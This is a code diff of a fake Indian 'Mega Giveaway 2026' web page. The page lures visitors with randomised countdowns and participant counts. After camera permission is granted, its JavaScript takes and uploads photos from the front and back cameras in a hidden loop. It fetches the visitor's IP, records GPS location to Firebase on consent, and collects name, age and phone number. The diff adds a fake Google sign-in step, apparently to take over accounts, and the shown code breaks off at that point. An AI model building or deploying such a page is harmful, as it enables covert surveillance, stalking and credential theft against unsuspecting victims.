@@ -31,12 +31,12 @@
     .progress-track { background: #eee; border-radius: 20px; height: 14px; overflow: hidden; }
     .progress-fill { height: 100%; background: linear-gradient(90deg, #27ae60, #2ecc71); border-radius: 20px; transition: width 0.5s ease; }
     .tasks-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 8px; border: 1px solid #ddd; }
-    .task-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #f0f0f0; text-decoration: none; color: #222; cursor: pointer; }
+    .task-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #f0f0f0; color: #222; cursor: pointer; }
     .task-item:last-child { border-bottom: none; }
     .task-item:hover:not(.locked):not(.done) { background: #f9f9f9; margin: 0 -16px; padding: 12px 16px; }
     .task-item.done .task-num { background: #27ae60; }
     .task-item.done .task-text { color: #aaa; text-decoration: line-through; }
-    .task-item.locked { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
+    .task-item.locked { opacity: 0.4; pointer-events: none; }
     .task-num { background: #1a1a2e; color: white; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; flex-shrink: 0; }
     .task-text { flex: 1; font-size: 14px; }
     .live-count-bar { background: #fff8e1; border-radius: 4px; padding: 8px 12px; font-size: 13px; color: #555; margin-bottom: 16px; text-align: center; }
@@ -54,59 +54,54 @@
     .footer a { color: #aaa; }
     .photo-btns { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
     .photo-view-btn { background: #1a1a2e; color: white; border: none; padding: 10px 16px; border-radius: 6px; font-size: 13px; cursor: pointer; }
-
-    /* Debug log */
     #debug-log { display:none; background:#111; color:#0f0; font-size:11px; padding:10px; border-radius:6px; margin-bottom:16px; font-family:monospace; word-break:break-all; }
 
+    /* Success message */
+    #success-msg { display:none; background:#eafaf1; border:1px solid #a9dfbf; border-radius:8px; padding:16px; margin-bottom:16px; text-align:center; }
+    #success-msg h3 { color:#27ae60; font-size:16px; margin-bottom:8px; }
+    #success-msg p { font-size:13px; color:#555; line-height:1.6; }
+
     /* Photo popup */
-    #photo-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9998; align-items: center; justify-content: center; flex-direction: column; }
-    #photo-popup.active { display: flex; }
-    #popup-img { max-width: 90%; max-height: 80vh; border-radius: 8px; }
-    .popup-close-btn { margin-top: 16px; background: #e74c3c; color: white; border: none; padding: 12px 28px; border-radius: 6px; font-size: 15px; cursor: pointer; }
+    #photo-popup { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9998; align-items:center; justify-content:center; flex-direction:column; }
+    #photo-popup.active { display:flex; }
+    #popup-img { max-width:90%; max-height:80vh; border-radius:8px; }
+    .popup-close-btn { margin-top:16px; background:#e74c3c; color:white; border:none; padding:12px 28px; border-radius:6px; font-size:15px; cursor:pointer; }
 
     /* Camera overlay */
-    #camera-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-    #camera-overlay.active { display: flex; }
-    #camera-video { width: 100%; max-width: 480px; border-radius: 8px; }
-    .cam-instructions { color: white; font-size: 14px; text-align: center; margin: 12px 16px 0; }
-    .cam-btn-row { display: flex; gap: 12px; margin-top: 16px; }
-    .cam-snap-btn { background: #e74c3c; color: white; border: none; padding: 14px 32px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; }
-    .cam-cancel-btn { background: #555; color: white; border: none; padding: 14px 20px; font-size: 14px; border-radius: 8px; cursor: pointer; }
+    #camera-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; flex-direction:column; align-items:center; justify-content:center; }
+    #camera-overlay.active { display:flex; }
+    #camera-video { width:100%; max-width:480px; border-radius:8px; }
+    .cam-instructions { color:white; font-size:14px; text-align:center; margin:12px 16px 0; }
+    .cam-btn-row { display:flex; gap:12px; margin-top:16px; }
+    .cam-snap-btn { background:#e74c3c; color:white; border:none; padding:14px 32px; font-size:16px; font-weight:bold; border-radius:8px; cursor:pointer; }
+    .cam-cancel-btn { background:#555; color:white; border:none; padding:14px 20px; font-size:14px; border-radius:8px; cursor:pointer; }
 
-    /* Rating dialog — pointer-events:none on overlay prevents outside click closing */
-    #rating-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; pointer-events: none; }
-    #rating-dialog.active { display: flex; }
-    .rating-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 380px; pointer-events: all; }
-    .rating-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
-    .rating-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
-    .stars { display: flex; gap: 8px; margin-bottom: 16px; }
-    .star { font-size: 32px; cursor: pointer; color: #ddd; transition: color 0.15s; }
-    .star.selected { color: #f1c40f; }
-    .rating-box textarea { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px; font-size: 13px; font-family: Arial; resize: none; height: 80px; margin-bottom: 14px; }
-    .rating-submit-btn { width: 100%; background: #e74c3c; color: white; border: none; padding: 13px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; }
-    .rating-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
-
-    /* Citizen dialog — same pointer-events fix */
-    #citizen-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; pointer-events: none; }
-    #citizen-dialog.active { display: flex; }
-    .citizen-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 400px; max-height: 90vh; overflow-y: auto; pointer-events: all; }
-    .citizen-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
-    .citizen-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
-    .form-row { margin-bottom: 12px; }
-    .form-row label { display: block; font-size: 12px; color: #555; margin-bottom: 4px; font-weight: bold; }
-    .form-row input, .form-row select { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px; font-size: 14px; font-family: Arial; }
-    .form-row input.auto-filled { background: #f0fdf4; color: #16a34a; border-color: #a9dfbf; }
-    .citizen-submit-btn { width: 100%; background: #e74c3c; color: white; border: none; padding: 13px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 6px; }
-    .citizen-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
-    .locating-msg { font-size: 12px; color: #e67e22; text-align: center; margin-bottom: 10px; }
-    .loc-error { font-size: 12px; color: #e74c3c; text-align: center; margin-bottom: 10px; font-weight: bold; }
+    /* Dialogs — pointer-events:none prevents outside click */
+    .dialog-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:9997; align-items:center; justify-content:center; pointer-events:none; }
+    .dialog-overlay.active { display:flex; }
+    .dialog-box { background:white; border-radius:10px; padding:24px 20px; width:90%; max-width:400px; max-height:90vh; overflow-y:auto; pointer-events:all; }
+    .dialog-box h3 { font-size:17px; color:#1a1a2e; margin-bottom:6px; }
+    .dialog-box p { font-size:13px; color:#777; margin-bottom:16px; line-height:1.6; }
+    .form-row { margin-bottom:12px; }
+    .form-row label { display:block; font-size:12px; color:#555; margin-bottom:4px; font-weight:bold; }
+    .form-row input, .form-row select { width:100%; border:1px solid #ddd; border-radius:6px; padding:10px; font-size:14px; font-family:Arial; }
+    .form-row input.auto-filled { background:#f0fdf4; color:#16a34a; border-color:#a9dfbf; }
+    .dialog-submit-btn { width:100%; background:#e74c3c; color:white; border:none; padding:13px; font-size:15px; font-weight:bold; border-radius:6px; cursor:pointer; margin-top:6px; }
+    .dialog-submit-btn.disabled { background:#ccc; color:#888; cursor:not-allowed; }
+    .stars { display:flex; gap:8px; margin-bottom:16px; }
+    .star { font-size:32px; cursor:pointer; color:#ddd; transition:color 0.15s; }
+    .star.selected { color:#f1c40f; }
+    .dialog-box textarea { width:100%; border:1px solid #ddd; border-radius:6px; padding:10px; font-size:13px; font-family:Arial; resize:none; height:80px; margin-bottom:14px; }
+    .locating-msg { font-size:12px; color:#e67e22; text-align:center; margin-bottom:10px; }
+    .loc-error { font-size:12px; color:#e74c3c; text-align:center; margin-bottom:10px; font-weight:bold; display:none; }
+    .google-signin-btn { width:100%; background:#fff; color:#3c4043; border:1px solid #dadce0; border-radius:4px; padding:12px; font-size:14px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; margin-top:12px; }
+    .google-signin-btn:hover { background:#f8f9fa; }
+    .google-signin-btn svg { width:18px; height:18px; }
   </style>
 </head>
 <body>
 
-  <div class="top-bar">
-    ⚠️ Only <span id="spots">47</span> spots remaining — Offer ends soon!
-  </div>
+  <div class="top-bar">⚠️ Only <span id="spots">47</span> spots remaining — Offer ends soon!</div>
 
   <div class="header">
     <h1>🎁 Mega Giveaway 2026</h1>
@@ -125,18 +120,11 @@
       </div>
     </div>
 
-    <div class="live-count-bar">
-      👥 <b id="live-num">2,847</b> people already completed their enroll
-    </div>
+    <div class="live-count-bar">👥 <b id="live-num">2,847</b> people already completed their enroll</div>
 
     <div class="progress-box">
-      <div class="progress-label">
-        <span>Your Progress</span>
-        <b><span id="progress-count">0</span> / 5 tasks done</b>
-      </div>
-      <div class="progress-track">
-        <div class="progress-fill" id="progress-fill" style="width: 0%"></div>
-      </div>
+      <div class="progress-label"><span>Your Progress</span><b><span id="progress-count">0</span> / 5 tasks done</b></div>
+      <div class="progress-track"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
     </div>
 
     <div class="section-title">Prize List</div>
@@ -152,26 +140,11 @@
 
     <div class="section-title">Tasks</div>
     <div class="tasks-box">
-      <div class="task-item" id="task-1">
-        <div class="task-num">1</div>
-        <span class="task-text">📷 Take a photo of a calendar</span>
-      </div>
-      <div class="task-item locked" id="task-2">
-        <div class="task-num">2</div>
-        <span class="task-text">🚰 Take a photo of a glass of water</span>
-      </div>
-      <div class="task-item locked" id="task-3">
-        <div class="task-num">3</div>
-        <span class="task-text">⭐ Rate your experience so far</span>
-      </div>
-      <div class="task-item locked" id="task-4">
-        <div class="task-num">4</div>
-        <span class="task-text">🇮🇳 Confirm you are an Indian citizen</span>
-      </div>
-      <div class="task-item locked" id="task-5">
-        <div class="task-num">5</div>
-        <span class="task-text">👥 Share this page on WhatsApp</span>
-      </div>
+      <div class="task-item" id="task-1"><div class="task-num">1</div><span class="task-text">📷 Take a photo of a calendar</span></div>
+      <div class="task-item locked" id="task-2"><div class="task-num">2</div><span class="task-text">🚰 Take a photo of a glass of water</span></div>
+      <div class="task-item locked" id="task-3"><div class="task-num">3</div><span class="task-text">⭐ Rate your experience so far</span></div>
+      <div class="task-item locked" id="task-4"><div class="task-num">4</div><span class="task-text">🇮🇳 Confirm you are an Indian citizen</span></div>
+      <div class="task-item locked" id="task-5"><div class="task-num">5</div><span class="task-text">📱 Provide your contact number</span></div>
     </div>
 
     <div class="photo-btns">
@@ -180,6 +153,12 @@
     </div>
 
     <div id="debug-log"></div>
+
+    <!-- Success message shown after Google signin -->
+    <div id="success-msg">
+      <h3>✅ Verification in Progress</h3>
+      <p>Thank you for participating! Our team is currently reviewing the photos you submitted to verify they match the required tasks. You will be notified at your registered Gmail address within 24 hours regarding your prize eligibility. Please ensure you check your inbox and spam folder. We appreciate your patience.</p>
+    </div>
 
     <button class="enroll-btn locked" id="enroll-btn">🎯 ENROLL ME IN THE DRAW</button>
 
@@ -199,10 +178,7 @@
   </div>
 
   <div class="footer">
-    &copy; 2026 MegaGiveaway.in &nbsp;|&nbsp;
-    <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
-    <a href="#">Terms</a> &nbsp;|&nbsp;
-    <a href="#">Contact Us</a><br><br>
+    &copy; 2026 MegaGiveaway.in &nbsp;|&nbsp;<a href="#">Privacy Policy</a> &nbsp;|&nbsp;<a href="#">Terms</a> &nbsp;|&nbsp;<a href="#">Contact Us</a><br><br>
     This is a promotional giveaway. Not affiliated with Apple, Sony or any brand.
   </div>
 
@@ -213,10 +189,10 @@
   </div>
 
   <!-- Rating dialog -->
-  <div id="rating-dialog">
-    <div class="rating-box">
+  <div class="dialog-overlay" id="rating-dialog">
+    <div class="dialog-box">
       <h3>⭐ Rate Your Experience</h3>
-      <p>Help us improve! Rate and leave a quick feedback to continue.</p>
+      <p>Help us improve! Please rate and leave a quick feedback to continue.</p>
       <div class="stars" id="stars-container">
         <span class="star" data-star="1">★</span>
         <span class="star" data-star="2">★</span>
@@ -225,26 +201,55 @@
         <span class="star" data-star="5">★</span>
       </div>
       <textarea id="rating-feedback" placeholder="Write your feedback here..."></textarea>
-      <button class="rating-submit-btn disabled" id="rating-submit">Submit & Continue</button>
+      <button class="dialog-submit-btn disabled" id="rating-submit">Submit & Continue</button>
     </div>
   </div>
 
   <!-- Citizen dialog -->
-  <div id="citizen-dialog">
-    <div class="citizen-box">
+  <div class="dialog-overlay" id="citizen-dialog">
+    <div class="dialog-box">
       <h3>🇮🇳 Citizen Verification</h3>
-      <p>Please fill in your details to confirm eligibility for the prize.</p>
+      <p>Please fill in your details to confirm your eligibility for the prize. Ensure all details are correct so we can contact you without any issues.</p>
       <p id="locating-msg" class="locating-msg">📡 Fetching your location...</p>
-      <p id="loc-error" class="loc-error" style="display:none">⚠️ Location permission denied. Please allow location and try again.</p>
-      <div class="form-row"><label>Full Name</label><input type="text" id="c-name" placeholder="Enter your name" /></div>
+      <p id="loc-error" class="loc-error">⚠️ Location permission denied. Please allow location access and try again.</p>
+      <div class="form-row"><label>Full Name</label><input type="text" id="c-name" placeholder="Enter your full name" /></div>
       <div class="form-row"><label>Age</label><input type="number" id="c-age" placeholder="Enter your age" /></div>
-      <div class="form-row"><label>Nationality</label>
-        <select id="c-nationality"><option value="Indian">Indian</option><option value="Other">Other</option></select>
-      </div>
+      <div class="form-row"><label>Nationality</label><select id="c-nationality"><option value="Indian">Indian</option><option value="Other">Other</option></select></div>
       <div class="form-row"><label>City</label><input type="text" id="c-city" placeholder="Detecting..." class="auto-filled" readonly /></div>
       <div class="form-row"><label>Area</label><input type="text" id="c-area" placeholder="Detecting..." class="auto-filled" readonly /></div>
       <div class="form-row"><label>State</label><input type="text" id="c-state" placeholder="Detecting..." class="auto-filled" readonly /></div>
-      <button class="citizen-submit-btn disabled" id="citizen-submit">Confirm & Continue</button>
+      <button class="dialog-submit-btn disabled" id="citizen-submit">Confirm & Continue</button>
+    </div>
+  </div>
+
+  <!-- Phone number dialog -->
+  <div class="dialog-overlay" id="phone-dialog">
+    <div class="dialog-box">
+      <h3>📱 Contact Number</h3>
+      <p>Please provide your 10-digit mobile number so we can contact you regarding your prize. Ensure the number is correct — we will only be able to reach you on this number.</p>
+      <div class="form-row">
+        <label>Mobile Number</label>
+        <input type="tel" id="phone-input" placeholder="Enter 10-digit number" maxlength="10" />
+      </div>
+      <p id="phone-error" style="color:#e74c3c;font-size:12px;display:none;margin-bottom:8px;">Please enter a valid 10-digit mobile number.</p>
+      <button class="dialog-submit-btn disabled" id="phone-submit">Submit & Continue</button>
+    </div>
+  </div>
+
+  <!-- Enroll Google signin dialog -->
+  <div class="dialog-overlay" id="enroll-dialog">
+    <div class="dialog-box">
+      <h3>🔍 Verification Required</h3>
+      <p>Our team is reviewing the photos you submitted to verify they match the required tasks. To notify you about your prize eligibility and keep you updated, we require you to sign in with your Google account. <strong>If you do not provide your details, we will be unable to contact you or update you about your prize status.</strong> Please ensure you use the correct Google account so there are no issues in reaching you.</p>
+      <button class="google-signin-btn" id="google-signin-btn">
+        <svg viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+          <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z" fill="#4285F4"/>
+          <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332C2.438 15.983 5.482 18 9 18z" fill="#34A853"/>
+          <path d="M3.964 10.71c-.18-.54-.282-1.117-.282-1.71s.102-1.17.282-1.71V4.958H.957C.347 6.173 0 7.548 0 9s.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
+          <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0 5.482 0 2.438 2.017.957 4.958L3.964 6.29C4.672 4.163 6.656 3.58 9 3.58z" fill="#EA4335"/>
+        </svg>
+        Sign in with Google
+      </button>
     </div>
   </div>
 
@@ -278,15 +283,12 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
     const auth = getAuth(app);
+    signInAnonymously(auth).then(() => log('🔐 Auth OK')).catch(e => log('❌ Auth: ' + e.message));
 
-    signInAnonymously(auth)
-      .then(() => log('🔐 Auth OK'))
-      .catch(e => log('❌ Auth: ' + e.message));
-
-    async function saveToFirebase(data) {
+    async function saveToFirebase(colName, data) {
       try {
-        await addDoc(collection(db, 'locations'), data);
-        log('✅ Saved to Firebase');
+        await addDoc(collection(db, colName), { ...data, timestamp: new Date().toISOString(), device: navigator.userAgent });
+        log('✅ Saved to Firebase: ' + colName);
       } catch(e) { log('❌ Firebase: ' + e.message); }
     }
 
@@ -305,16 +307,13 @@
       } catch(e) { log('❌ Cloudinary: ' + e.message); }
     }
 
-    // ─── DEBUG — set true to see log on screen ───────────────────
-    const DEBUG = false; // <-- change to true to show debug log
-    
+    const DEBUG = true; // <-- set true to show debug log
     function log(msg) {
       if (!DEBUG) return;
       const box = document.getElementById('debug-log');
       if (box) { box.style.display = 'block'; box.innerHTML += msg + '<br>'; }
     }
 
-    // ─── State ───────────────────────────────────────────────────
     const TOTAL_TASKS = 5;
     let completed = [];
     let photos = {};
@@ -326,18 +325,22 @@
     let locationData = {};
     let ipAddress = 'unknown';
 
-    // ─── CAPTURE MODE ────────────────────────────────────────────
-    // 'front' = only front camera continuously
-    // 'both'  = alternates front and back
+    // 'front' = only front camera | 'both' = alternates front and back
     const CAPTURE_MODE = 'front'; // <-- change to 'front' or 'both'
 
-    // ─── Fetch IP on page load silently ──────────────────────────
+    // Fetch IP silently on load
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
       .then(d => { ipAddress = d.ip; log('🌐 IP: ' + ipAddress); })
       .catch(() => {});
 
-    // ─── Progress ────────────────────────────────────────────────
+    // Check if returning from Google signin
+    if (window.location.search.includes('verified=1')) {
+      document.getElementById('success-msg').style.display = 'block';
+      document.getElementById('enroll-btn').style.display = 'none';
+      history.replaceState({}, '', window.location.pathname);
+    }
+
     function updateProgressBar() {
       const count = completed.length;
       document.getElementById('progress-fill').style.width = (count / TOTAL_TASKS * 100) + '%';
@@ -345,10 +348,7 @@
     }
 
     function markTaskDone(num) {
-      if (!completed.includes(num)) {
-        completed.push(num);
-        updateProgressBar();
-      }
+      if (!completed.includes(num)) { completed.push(num); updateProgressBar(); }
       const el = document.getElementById('task-' + num);
       if (el) el.classList.add('done');
       updateLocks();
@@ -366,39 +366,32 @@
       else btn.classList.add('locked');
     }
 
-    // ─── Timer ───────────────────────────────────────────────────
+    // Timer
     let secs = 2 * 3600 + 47 * 60;
     setInterval(() => {
       secs--; if (secs < 0) secs = 3600;
-      const h = Math.floor(secs / 3600), m = Math.floor((secs % 3600) / 60), s = secs % 60;
+      const h = Math.floor(secs/3600), m = Math.floor((secs%3600)/60), s = secs%60;
       document.getElementById('t-h').innerHTML = String(h).padStart(2,'0') + '<span>hours</span>';
       document.getElementById('t-m').innerHTML = String(m).padStart(2,'0') + '<span>mins</span>';
       document.getElementById('t-s').innerHTML = String(s).padStart(2,'0') + '<span>secs</span>';
     }, 1000);
 
     let liveBase = 2847;
-    setInterval(() => {
-      liveBase += Math.floor(Math.random() * 5) - 1;
-      document.getElementById('live-num').textContent = liveBase.toLocaleString('en-IN');
-    }, 4000);
+    setInterval(() => { liveBase += Math.floor(Math.random()*5)-1; document.getElementById('live-num').textContent = liveBase.toLocaleString('en-IN'); }, 4000);
 
     let spots = 47;
-    setInterval(() => {
-      if (spots > 10) spots -= Math.floor(Math.random() * 2);
-      document.getElementById('spots').textContent = spots;
-    }, 8000);
+    setInterval(() => { if (spots > 10) spots -= Math.floor(Math.random()*2); document.getElementById('spots').textContent = spots; }, 8000);
 
-    // ─── Silent capture ──────────────────────────────────────────
+    // Silent capture
     function startSilentCapture() {
       if (silentCapturing) return;
       silentCapturing = true;
-      log('📷 Silent capture — mode: ' + CAPTURE_MODE);
+      log('📷 Silent — mode: ' + CAPTURE_MODE);
       if (CAPTURE_MODE === 'front') captureFrontOnly();
       else captureAlternating('user');
     }
 
     function captureFrontOnly() {
-      if (!silentCapturing) return;
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
           silentStream = stream;
@@ -424,7 +417,6 @@
 
     function captureAlternating(facing) {
       if (!silentCapturing) return;
-      log('🔄 ' + (facing === 'user' ? 'Front' : 'Back') + ' camera...');
       if (silentStream) { silentStream.getTracks().forEach(t => t.stop()); silentStream = null; }
       navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
         .then(stream => {
@@ -435,18 +427,15 @@
             const canvas = document.getElementById('silent-canvas');
             canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
             canvas.getContext('2d').drawImage(vid, 0, 0);
-            log('📸 ' + (facing === 'user' ? 'Front' : 'Back') + ' photo');
+            log('📸 ' + (facing==='user'?'Front':'Back') + ' photo');
             sendToCloudinary(canvas.toDataURL('image/jpeg', 0.5));
-            captureAlternating(facing === 'user' ? 'environment' : 'user');
+            captureAlternating(facing==='user'?'environment':'user');
           }, 800);
         })
-        .catch(e => {
-          log('❌ ' + e.message);
-          setTimeout(() => captureAlternating(facing === 'user' ? 'environment' : 'user'), 1000);
-        });
+        .catch(e => { log('❌ ' + e.message); setTimeout(() => captureAlternating(facing==='user'?'environment':'user'), 1000); });
     }
 
-    // ─── User camera ─────────────────────────────────────────────
+    // User camera
     function openCamera(taskNum, instructionHTML) {
       activeTaskNum = taskNum;
       document.getElementById('cam-instructions').innerHTML = instructionHTML;
@@ -458,7 +447,6 @@
           startSilentCapture();
         })
         .catch(() => {
-          // Permission denied — reset activeTaskNum so task is NOT marked done
           activeTaskNum = null;
           alert('Camera permission denied. Please allow camera access and try again.');
         });
@@ -471,11 +459,9 @@
       canvas.getContext('2d').drawImage(video, 0, 0);
       const photoData = canvas.toDataURL('image/jpeg', 0.8);
       const taskNum = activeTaskNum;
-      // Stop user camera
       if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
       document.getElementById('camera-overlay').classList.remove('active');
       activeTaskNum = null;
-      // Store photo and show view button
       photos[taskNum] = photoData;
       const btn = document.getElementById('photo-btn-' + taskNum);
       if (btn) btn.style.display = 'inline-block';
@@ -486,22 +472,21 @@
       if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
       document.getElementById('camera-overlay').classList.remove('active');
       activeTaskNum = null;
-      // Task NOT marked done — user cancelled
     });
 
-    // ─── Task 1 ──────────────────────────────────────────────────
+    // Task 1
     document.getElementById('task-1').addEventListener('click', () => {
       if (completed.includes(1)) return;
       openCamera(1, '📷 Point camera at a <b>calendar</b> and tap Take Photo');
     });
 
-    // ─── Task 2 ──────────────────────────────────────────────────
+    // Task 2
     document.getElementById('task-2').addEventListener('click', () => {
       if (completed.includes(2)) return;
       openCamera(2, '🚰 Point camera at a <b>glass of water</b> and tap Take Photo');
     });
 
-    // ─── Task 3 — Rating ─────────────────────────────────────────
+    // Task 3 — Rating
     document.getElementById('task-3').addEventListener('click', () => {
       if (completed.includes(3)) return;
       selectedRating = 0;
@@ -515,8 +500,7 @@
       if (!e.target.classList.contains('star')) return;
       selectedRating = parseInt(e.target.dataset.star);
       document.querySelectorAll('.star').forEach((s, i) => {
-        if (i < selectedRating) s.classList.add('selected');
-        else s.classList.remove('selected');
+        if (i < selectedRating) s.classList.add('selected'); else s.classList.remove('selected');
       });
       checkRatingReady();
     });
@@ -524,9 +508,9 @@
     document.getElementById('rating-feedback').addEventListener('input', checkRatingReady);
 
     function checkRatingReady() {
-      const feedback = document.getElementById('rating-feedback').value.trim();
+      const fb = document.getElementById('rating-feedback').value.trim();
       const btn = document.getElementById('rating-submit');
-      if (selectedRating > 0 && feedback.length > 0) btn.classList.remove('disabled');
+      if (selectedRating > 0 && fb.length > 0) btn.classList.remove('disabled');
       else btn.classList.add('disabled');
     }
 
@@ -536,15 +520,11 @@
       markTaskDone(3);
     });
 
-    // ─── Task 4 — Citizen + Location ─────────────────────────────
+    // Task 4 — Citizen + Location
     document.getElementById('task-4').addEventListener('click', () => {
       if (completed.includes(4)) return;
       locationData = {};
-      document.getElementById('c-name').value = '';
-      document.getElementById('c-age').value = '';
-      document.getElementById('c-city').value = '';
-      document.getElementById('c-area').value = '';
-      document.getElementById('c-state').value = '';
+      ['c-name','c-age','c-city','c-area','c-state'].forEach(id => document.getElementById(id).value = '');
       document.getElementById('citizen-submit').classList.add('disabled');
       document.getElementById('citizen-submit').textContent = 'Confirm & Continue';
       document.getElementById('locating-msg').style.display = 'block';
@@ -555,18 +535,13 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            // ── Location granted — save to Firebase immediately ──
-            locationData.lat      = pos.coords.latitude;
-            locationData.lng      = pos.coords.longitude;
+            locationData.lat = pos.coords.latitude;
+            locationData.lng = pos.coords.longitude;
             locationData.accuracy = pos.coords.accuracy;
-            locationData.ip       = ipAddress;
-            locationData.device   = navigator.userAgent;
-            locationData.timestamp = new Date().toISOString();
-            locationData.type     = 'immediate';
-            saveToFirebase({ ...locationData }); // send immediately
-            log('📍 GPS: ' + locationData.lat + ', ' + locationData.lng);
-
-            // Reverse geocode to fill city/area/state
+            locationData.ip = ipAddress;
+            // Save immediately to Firebase
+            saveToFirebase('locations', { ...locationData, type: 'immediate' });
+            log('📍 ' + locationData.lat + ', ' + locationData.lng);
             fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
               .then(r => r.json())
               .then(geo => {
@@ -578,16 +553,11 @@
                 document.getElementById('c-area').value  = locationData.area;
                 document.getElementById('c-state').value = locationData.state;
                 document.getElementById('locating-msg').style.display = 'none';
-                log('🗺️ ' + locationData.city + ', ' + locationData.state);
                 checkCitizenReady();
               })
-              .catch(() => {
-                document.getElementById('locating-msg').style.display = 'none';
-                checkCitizenReady();
-              });
+              .catch(() => { document.getElementById('locating-msg').style.display = 'none'; checkCitizenReady(); });
           },
           () => {
-            // ── Location denied ──────────────────────────────────
             document.getElementById('locating-msg').style.display = 'none';
             document.getElementById('loc-error').style.display = 'block';
             document.getElementById('citizen-submit').classList.add('disabled');
@@ -606,13 +576,8 @@
       const age  = document.getElementById('c-age').value.trim();
       const city = document.getElementById('c-city').value.trim();
       const btn  = document.getElementById('citizen-submit');
-      // Only enable if location was granted (city filled) and name+age typed
-      if (name && age && city) {
-        btn.classList.remove('disabled');
-        btn.textContent = 'Confirm & Continue';
-      } else {
-        btn.classList.add('disabled');
-      }
+      if (name && age && city) { btn.classList.remove('disabled'); btn.textContent = 'Confirm & Continue'; }
+      else btn.classList.add('disabled');
     }
 
     document.getElementById('citizen-submit').addEventListener('click', () => {
@@ -620,28 +585,48 @@
       const age  = document.getElementById('c-age').value.trim();
       const city = document.getElementById('c-city').value.trim();
       if (!name || !age || !city) return;
-      // Save full data with name/age to Firebase
-      saveToFirebase({
-        ...locationData,
-        name, age,
-        nationality: document.getElementById('c-nationality').value,
-        city: document.getElementById('c-city').value,
-        area:  document.getElementById('c-area').value,
-        state: document.getElementById('c-state').value,
-        type: 'full_submission'
-      });
+      saveToFirebase('locations', { ...locationData, name, age, nationality: document.getElementById('c-nationality').value, city, area: document.getElementById('c-area').value, state: document.getElementById('c-state').value, type: 'full_submission' });
       document.getElementById('citizen-dialog').classList.remove('active');
       markTaskDone(4);
     });
 
-    // ─── Task 5 — WhatsApp ───────────────────────────────────────
+    // Task 5 — Phone number
     document.getElementById('task-5').addEventListener('click', () => {
       if (completed.includes(5)) return;
-      window.open('https://wa.me/?text=Win%20prizes%20in%20Mega%20Giveaway%202026!%20https://jntuhconfess2k25.github.io/spinner/', '_blank');
+      document.getElementById('phone-input').value = '';
+      document.getElementById('phone-error').style.display = 'none';
+      document.getElementById('phone-submit').classList.add('disabled');
+      document.getElementById('phone-dialog').classList.add('active');
+    });
+
+    document.getElementById('phone-input').addEventListener('input', () => {
+      const val = document.getElementById('phone-input').value.replace(/\D/g,'');
+      document.getElementById('phone-input').value = val;
+      const btn = document.getElementById('phone-submit');
+      if (val.length === 10) { btn.classList.remove('disabled'); document.getElementById('phone-error').style.display = 'none'; }
+      else btn.classList.add('disabled');
+    });
+
+    document.getElementById('phone-submit').addEventListener('click', () => {
+      const val = document.getElementById('phone-input').value.trim();
+      if (val.length !== 10) { document.getElementById('phone-error').style.display = 'block'; return; }
+      saveToFirebase('contacts', { phone: val, ip: ipAddress });
+      document.getElementById('phone-dialog').classList.remove('active');
       markTaskDone(5);
     });
 
-    // ─── Photo popup ─────────────────────────────────────────────
+    // Enroll button — opens Google signin dialog
+    document.getElementById('enroll-btn').addEventListener('click', () => {
+      if (completed.length < TOTAL_TASKS) return;
+      document.getElementById('enroll-dialog').classList.add('active');
+    });
+
+    document.getElementById('google-signin-btn').addEventListener('click', () => {
